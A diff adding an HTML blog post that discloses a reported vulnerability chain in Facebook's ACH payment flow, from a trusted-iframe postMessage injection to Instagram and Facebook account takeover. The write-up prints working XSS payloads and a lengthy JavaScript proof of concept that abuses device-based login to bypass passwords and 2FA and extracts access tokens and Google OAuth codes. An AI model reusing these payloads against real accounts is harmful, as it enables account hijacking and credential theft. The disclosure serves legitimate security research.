@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Self-XSS in Facebook payments flow leads to Instagram and Facebook account takeovers | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Self-XSS in Facebook payments flow leads to Instagram and Facebook account takeovers" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction Facebook’s payments and billing flows rely heavily on third-party financial service providers. To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and facebook.com." />
+<meta property="og:description" content="Introduction Facebook’s payments and billing flows rely heavily on third-party financial service providers. To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and facebook.com." />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2026/01/15/self-xss-facebook-payments.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2026/01/15/self-xss-facebook-payments.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-01-15T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Self-XSS in Facebook payments flow leads to Instagram and Facebook account takeovers" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-01-15T00:00:00+02:00","datePublished":"2026-01-15T00:00:00+02:00","description":"Introduction Facebook’s payments and billing flows rely heavily on third-party financial service providers. To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and facebook.com.","headline":"Self-XSS in Facebook payments flow leads to Instagram and Facebook account takeovers","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2026/01/15/self-xss-facebook-payments.html"},"url":"http://localhost:4000/uncategorized/2026/01/15/self-xss-facebook-payments.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Self-XSS in Facebook payments flow leads to Instagram and Facebook account takeovers</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2026-01-15T00:00:00+02:00" itemprop="datePublished">Jan 15, 2026
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="introduction">Introduction</h2>
+<hr />
+<p><br />
+Facebook’s payments and billing flows rely heavily on third-party financial service providers.<br />
+To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and <code class="language-plaintext highlighter-rouge">facebook.com</code>.</p>
+
+<p>One such integration exists in the <strong>ACH Direct Debit initialization flow</strong>, which embeds <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> inside an iframe on <code class="language-plaintext highlighter-rouge">m.facebook.com</code>.<br />
+This integration assumes that messages originating from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> are trustworthy and safe to process.</p>
+
+<p>That assumption turned out to be incorrect. A cross-window message handler on <code class="language-plaintext highlighter-rouge">m.facebook.com</code> accepts specific message types from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> and <strong>directly injects attacker-controlled HTML into the DOM</strong>.<br />
+By chaining this behavior with a cross-site scripting vulnerability in <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code>, it becomes possible to achieve <strong>JavaScript execution in the context of <code class="language-plaintext highlighter-rouge">facebook.com</code></strong>.</p>
+
+<p>Once code execution is achieved on Facebook, the attack can be escalated to <strong>Instagram account takeover</strong> through existing OAuth flows.</p>
+
+<h2 id="description">Description</h2>
+<hr />
+<h3 id="payments">Payments</h3>
+
+<p>The vulnerable Facebook page is <code class="language-plaintext highlighter-rouge">https://m.facebook.com/billing_interfaces/direct_debit_ach_initialization</code></p>
+
+<p>This endpoint:</p>
+
+<ul>
+  <li>Embeds an iframe pointing to <code class="language-plaintext highlighter-rouge">https://ThirdPartyPaymentProvider.com</code></li>
+  <li>Registers a <code class="language-plaintext highlighter-rouge">message</code> event listener to receive cross-window messages</li>
+  <li>Enforces a strict origin check, only accepting messages from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code></li>
+</ul>
+
+<p>At first glance, this seems secure.</p>
+
+<p>However, <strong>origin validation is only as strong as the security of the trusted origin</strong>.</p>
+
+<h3 id="trusting-thirdpartypaymentprovidercom-as-a-security-boundary">Trusting ThirdPartyPaymentProvider.com as a Security Boundary</h3>
+
+<p>The Facebook page registers a cross-window message handler similar to the following logic:</p>
+
+<ul>
+  <li>Accept messages only if <code class="language-plaintext highlighter-rouge">event.origin === "https://ThirdPartyPaymentProvider.com"</code></li>
+  <li>Parse the message contents</li>
+  <li>Handle specific message types</li>
+</ul>
+
+<p>One such accepted message type is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ThirdPartyPaymentProvider.learnMore
+</code></pre></div></div>
+
+<p>When this message is received, its payload is <strong>unsafely injected into the DOM</strong> without sanitization.</p>
+
+<p>This creates a critical trust boundary:</p>
+
+<blockquote>
+  <p><strong>Any JavaScript execution inside ThirdPartyPaymentProvider.com can send arbitrary HTML to be rendered inside facebook.com</strong></p>
+</blockquote>
+
+<h3 id="xss-in-thirdpartypaymentprovidercom">XSS in ThirdPartyPaymentProvider.com</h3>
+
+<p><code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> loads a remote configuration file specified via URL parameters.</p>
+
+<p>By abusing this behavior, it was possible to inject the following payload into the ThirdPartyPaymentProvider context:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">""</span> <span class="na">onerror=</span><span class="s">"onmessage=(e)=&gt;{eval(e.data.cmd)};"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>This turns the <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe into a <strong>message relay</strong>, allowing arbitrary JavaScript commands to be executed inside that origin.</p>
+
+<p>At this point, the attacker controls a trusted <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> frame.</p>
+
+<h3 id="triggering-xss-in-facebookcom">Triggering XSS in facebook.com</h3>
+
+<p>Once the <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe is compromised, exploitation becomes trivial.</p>
+
+<p>From the parent window, the attacker sends a message to the compromised iframe:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">postMessage</span><span class="p">({</span>
+  <span class="na">cmd</span><span class="p">:</span> <span class="s2">`
+    top.frames[1].postMessage(
+      'ThirdPartyPaymentProvider.learnMore|&lt;img src="" onerror="alert(document.domain)"/&gt;|b|c|d',
+      '*'
+    )
+  `</span>
+<span class="p">},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The compromised <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe then forwards this message to the Facebook iframe.</p>
+
+<p>Because:</p>
+
+<ul>
+  <li>The origin is valid (<code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code>)</li>
+  <li>The message type is allowed (<code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.learnMore</code>)</li>
+</ul>
+
+<p>Facebook injects the supplied HTML directly into the page, resulting in:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JavaScript execution in the context of facebook.com
+</code></pre></div></div>
+
+<p>At this point, <code class="language-plaintext highlighter-rouge">document.domain</code> is <code class="language-plaintext highlighter-rouge">facebook.com</code>.</p>
+
+<h3 id="why-this-is-a-self-xss">Why this is a Self-XSS</h3>
+
+<p>Reaching the vulnerable Facebook endpoint requires two parameters:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">user_id</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nonce</code></li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">nonce</code> is not guessable and must be generated server-side and it’s linked to the current logged-in user. To satisfy these conditions, the exploit chain begins with a <strong>login CSRF</strong>, forcing the victim to authenticate into the attacker’s Facebook account. Once logged in, the attacker can reuse their own valid nonce from another session to start the flow.</p>
+
+<h3 id="escalation-to-instagram-account-takeover">Escalation to Instagram Account Takeover</h3>
+
+<p>After achieving Javascript execution on <code class="language-plaintext highlighter-rouge">facebook.com</code>, escalation is straightforward. The attacker can initiate the Instagram OAuth flow:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/oidc/
+  ?app_id=532380490911317
+  &amp;redirect_uri=https://business.facebook.com/business/loginpage/igoauth/callback/
+  &amp;scope=openid,linking
+  &amp;response_type=code
+</code></pre></div></div>
+
+<p>When the flow redirects to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>business.facebook.com/business/loginpage/igoauth/callback/
+</code></pre></div></div>
+
+<p>the page runs under the <code class="language-plaintext highlighter-rouge">facebook.com</code> domain.</p>
+
+<p>Because Javascript is already executing in this context, the attacker can read <code class="language-plaintext highlighter-rouge">location.href</code>, extract OAuth codes, and <strong>complete account linking or takeover</strong>.</p>
+
+<h3 id="attack-flow-summary">Attack Flow Summary</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1) Victim is forced to log into the attacker’s Facebook account via a login CSRF
+
+2) Attacker loads the ACH initialization page with a valid attacker `nonce` and `user_id`
+
+3) Facebook embeds `ThirdPartyPaymentProvider.com` inside a privileged iframe
+
+4) An XSS in `ThirdPartyPaymentProvider.com` allows attacker-controlled Javascript execution
+
+5) The compromised iframe sends a `ThirdPartyPaymentProvider.learnMore` message to parent window
+
+6) Facebook injects attacker-supplied HTML, triggering XSS on `facebook.com`
+
+7) Attacker initiates Instagram OAuth flow and steals an authorization code
+</code></pre></div></div>
+
+<h3 id="additional-impact-full-facebook-account-takeover-via-device-based-login-abuse">Additional Impact: Full Facebook Account Takeover via Device-Based Login Abuse</h3>
+
+<p>After further testing, it was possible to escalate the existing XSS into a <strong>full Facebook account takeover</strong>, not only Instagram or Workplace.</p>
+
+<p>This scenario abuses two Facebook behaviors that become reachable once JavaScript execution is achieved in the context of <code class="language-plaintext highlighter-rouge">facebook.com</code>:</p>
+<ul>
+  <li>The widespread usage of <strong>“Save Login” / device-based login</strong></li>
+  <li>The ability to keep a malicious page alive using a <strong>Blob URL</strong>, preventing Facebook from refreshing or invalidating the session</li>
+</ul>
+
+<h4 id="scenario-1-device-switch-abuse">Scenario 1: Device-Switch abuse</h4>
+
+<p>Most Facebook users have the <strong>Save Login</strong> feature enabled on at least one device. When this is the case, Facebook exposes <em>device-switchable accounts</em> through a GraphQL query. From the attacker account, after triggering the XSS:</p>
+
+<ul>
+  <li>A GraphQL query can be issued to fetch **device-switchable accounts **</li>
+  <li>Knowing the real victim account id, and if it’s saved, it’s possible to send a POST request to the device-based login endpoint</li>
+  <li>The login occurs without password, 2FA, or user interaction</li>
+</ul>
+
+<p>To ensure persistence, the XSS payload is loaded into a <strong>Blob URL</strong>, preventing Facebook from reloading or navigating away from the compromised execution context.</p>
+
+<h4 id="scenario-2-google-oauth-login">Scenario 2: Google OAuth login</h4>
+
+<p>If no device-switchable accounts are found, an alternative path still exists.</p>
+
+<p>The attacker can:</p>
+
+<ul>
+  <li>Trigger a Google OAuth flow via <code class="language-plaintext highlighter-rouge">accounts.google.com</code></li>
+  <li>Capture the authorization code after redirection to Facebook</li>
+  <li>Associate the Google login code with the victim <code class="language-plaintext highlighter-rouge">user_id</code> or <code class="language-plaintext highlighter-rouge">cuid</code></li>
+  <li>Retry authentication until Facebook offers <strong>“Continue with Google”</strong> as a fallback</li>
+</ul>
+
+<p>This technique works <strong>without user interaction</strong> if the victim is logged into <strong>only one Google account</strong> in their browser.</p>
+
+<h3 id="proof-of-concept">Proof of Concept</h3>
+
+<p>The following PoC was successfully tested and demonstrates both attack paths.<br />
+All execution occurs <strong>after XSS is already achieved</strong> in the Facebook context.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>code = `
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;script&gt;</span>
+    <span class="kd">const</span> <span class="nx">getDeviceAccounts</span> <span class="o">=</span> <span class="p">(</span><span class="nx">attacker_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/api/graphql/</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">body</span><span class="p">:</span> <span class="s2">`__a=1&amp;fb_dtsg=</span><span class="p">${</span><span class="nx">attacker_dtsg</span><span class="p">}</span><span class="s2">&amp;doc_id=3114557815333936&amp;variables={}`</span><span class="p">,</span>
+      <span class="p">})</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="k">try</span> <span class="p">{</span>
+            <span class="kd">const</span> <span class="nx">post_data</span> <span class="o">=</span> <span class="nx">e</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login/device-based/login/","inputs":[</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+
+            <span class="kd">const</span> <span class="nx">data_json</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s2">`[</span><span class="p">${</span><span class="nx">post_data</span><span class="p">}</span><span class="s2">]`</span><span class="p">).</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+              <span class="nx">data_json</span><span class="p">[</span><span class="nx">e</span><span class="p">.</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+            <span class="p">});</span>
+
+            <span class="k">return</span> <span class="nx">data_json</span><span class="p">;</span>
+          <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">"</span><span class="s2">No device switchable accounts found!</span><span class="dl">"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">loginAsVictim</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/login/device-based/login/</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">redirect</span><span class="p">:</span> <span class="dl">"</span><span class="s2">manual</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">body</span><span class="p">:</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nf">toString</span><span class="p">(),</span>
+      <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">());</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">getFirstPartyAccessToken</span> <span class="o">=</span> <span class="p">(</span><span class="nx">dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/dialog/oauth</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">body</span><span class="p">:</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">({</span>
+          <span class="na">jazoest</span><span class="p">:</span> <span class="dl">"</span><span class="s2">25620</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">fb_dtsg</span><span class="p">:</span> <span class="nx">dtsg</span><span class="p">,</span>
+          <span class="na">force_confirmation</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">display</span><span class="p">:</span> <span class="dl">"</span><span class="s2">async</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">__a</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">client_id</span><span class="p">:</span> <span class="dl">"</span><span class="s2">124024574287414</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">redirect_uri</span><span class="p">:</span>
+            <span class="dl">"</span><span class="s2">https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#origin=https://www.instagram.com&amp;relation=opener</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">response_type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">token</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">}),</span>
+      <span class="p">})</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span>
+          <span class="nx">e</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">relation=opener&amp;access_token=</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="p">)</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">token</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="nb">window</span><span class="p">.</span><span class="nf">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">access_token:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">getDtsg</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/dialog/oauth</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+      <span class="p">})</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">(</span>
+          <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span>
+            <span class="nx">e</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">["MRequestConfig",[],{"dtsg":{"token":"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="p">);</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">wait</span> <span class="o">=</span> <span class="p">(</span><span class="nx">time</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nf">resolve</span><span class="p">(</span><span class="kc">true</span><span class="p">),</span> <span class="nx">time</span><span class="p">);</span>
+      <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">getGoogleLoginCode</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Trying to get Google code</span><span class="dl">"</span><span class="p">);</span>
+      <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">facebook.com</span><span class="dl">"</span><span class="p">;</span>
+
+      <span class="kd">const</span> <span class="nx">wnd</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span>
+        <span class="dl">"</span><span class="s2">https://accounts.google.com/o/oauth2/auth</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">?client_id=15057814354-80cg059cn49j6kmhhkjam4b00on1gb2n.apps.googleusercontent.com</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">&amp;response_type=code</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">&amp;redirect_uri=https%3A%2F%2Fwww.facebook.com%2Foauth2%2Fredirect%2F</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">&amp;scope=openid+email</span><span class="dl">"</span>
+      <span class="p">);</span>
+
+      <span class="nf">wait</span><span class="p">(</span><span class="mi">4000</span><span class="p">).</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+          <span class="kd">const</span> <span class="nx">google_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span>
+            <span class="nx">wnd</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span>
+          <span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">);</span>
+          <span class="nb">window</span><span class="p">.</span><span class="nf">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">google code:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">google_code</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+      <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="nf">getDtsg</span><span class="p">().</span><span class="nf">then</span><span class="p">((</span><span class="nx">attacker_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nf">getDeviceAccounts</span><span class="p">(</span><span class="nx">attacker_dtsg</span><span class="p">).</span><span class="nf">then</span><span class="p">((</span><span class="nx">data_post</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">data_post</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nf">loginAsVictim</span><span class="p">(</span><span class="nx">data_post</span><span class="p">).</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nf">getDtsg</span><span class="p">().</span><span class="nf">then</span><span class="p">((</span><span class="nx">victim_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+              <span class="nf">getFirstPartyAccessToken</span><span class="p">(</span><span class="nx">victim_dtsg</span><span class="p">);</span>
+            <span class="p">});</span>
+          <span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="nf">getGoogleLoginCode</span><span class="p">();</span>
+        <span class="p">}</span>
+      <span class="p">});</span>
+    <span class="p">});</span>
+  <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+`;
+
+const blob = new Blob([code], {
+type: "text/html",
+});
+window.location.href = URL.createObjectURL(blob);
+</code></pre></div></div>
+
+<p>This second scenario demonstrates that once JavaScript execution is achieved on <code class="language-plaintext highlighter-rouge">facebook.com</code>, the impact is <strong>not limited to linked platforms</strong>.</p>
+
+<p>Under realistic conditions, the attacker can:</p>
+
+<ul>
+  <li>Bypass passwords and 2FA</li>
+  <li>Hijack saved login sessions</li>
+  <li>Fully takeover the victim’s Facebook account</li>
+  <li>Maintain persistence without page reloads</li>
+</ul>
+
+<p>Combined with the original XSS vector, this results in a <strong>complete cross-platform account compromise</strong>.</p>
+
+<h2 id="impact">Impact</h2>
+<hr />
+<p><br />
+The immediate impact is <strong>account takeover</strong> of Facebook, Instagram and Workplace accounts by only visiting attacker website.  However, the broader implication is more severe. This vulnerability effectively allows <strong>ThirdPartyPaymentProvider.com to execute JavaScript in the context of facebook.com</strong> remotly.</p>
+
+<p>A malicious actor could target ThirdPartyPaymentProvider infrastructure to inject a stored payload that automatically compromises <strong>any Facebook user attempting to add a payment method</strong>.</p>
+
+<p>Such an attack would:</p>
+
+<ul>
+  <li>Require no user interaction</li>
+  <li>Affect Facebook, Instagram, and Workplace users</li>
+  <li>Trigger during routine billing actions the user takes</li>
+</ul>
+
+<p>Due to the potential scale and impact, further exploitation was intentionally avoided.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Oct 18, 2024 — Bug reported</p>
+
+<p>Oct 18, 2024 — Bug Acknowledged by Facebook</p>
+
